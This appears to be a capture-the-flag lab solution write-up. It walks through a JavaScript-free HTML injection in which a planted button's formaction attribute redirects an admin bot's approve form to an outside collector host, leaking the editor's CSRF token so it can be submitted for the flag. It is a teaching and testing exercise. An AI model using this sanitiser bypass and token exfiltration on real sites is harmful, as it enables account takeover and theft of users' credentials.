Full chain — no JavaScript anywhere. Plant a draft whose CTA button overrides the
approve form's target:

```
POST /blocks
Content-Type: application/json

{"html":"<p>Please approve our new campaign.</p><button type=\"submit\" formaction=\"http://collector:9000/report\" formmethod=\"post\">Approve draft</button>"}
```

The sanitiser keeps the button and its `formaction`/`formmethod` intact. Wait ~2s:
the editor bot loads `/admin/review`, which renders your button inside the
approve form (next to the hidden `csrf` field), and clicks `.draft button`. The
`formaction` redirects the form's POST to the collector, sending the token:

```
GET /oob/received
```

You will see a **POST** item whose (base64) body decodes to something like
`csrf=<32 hex>&block_id=b1`. That hex value is the editor's CSRF token. Submit it:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{…}`. `tests/exploit.py` runs the whole flow, asserts
`/admin/review` is `403` for you, and also plants a `<script>`/`<img onerror>`
control that produces **zero** beacons — proving the sanitiser is real and the
scriptless `formaction` override is the only way in.
